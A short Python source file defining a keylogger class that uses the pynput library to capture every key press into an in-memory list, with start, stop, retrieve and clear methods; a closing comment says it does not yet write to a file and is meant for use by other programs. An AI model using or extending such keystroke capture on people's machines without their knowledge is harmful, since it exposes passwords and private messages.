from pynput import keyboard

class IKeyLogger:
    def __init__(self):
        self.logged_keys = []
        self.listener = keyboard.Listener(on_press=self.press)
        
    def press(self, key):
        key = str(key)
        """if key == "'''":
            self.logged_keys.append(ord("'"))"""
    
        if key == "' '":
            self.logged_keys.append("space")
        elif key == "'\\n'":
            self.logged_keys.append(10)
        elif key == "'\\t'":
            self.logged_keys.append("tab")
        elif key == 'Key.backspace':
            self.logged_keys.append(8)
        elif key == 'Key.shift':
            self.logged_keys.append(16)
        else:
            self.logged_keys.append(key)
    def start_logging(self):
        
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()

    def get_logged_keys(self) -> list[str]:
        print(self.logged_keys)
        return self.logged_keys
    def clear_logged_keys(self) -> None:
        self.logged_keys = []
        

"""
stores keystrokes in memory (not in a file yet). to be used later by the other programs
"""
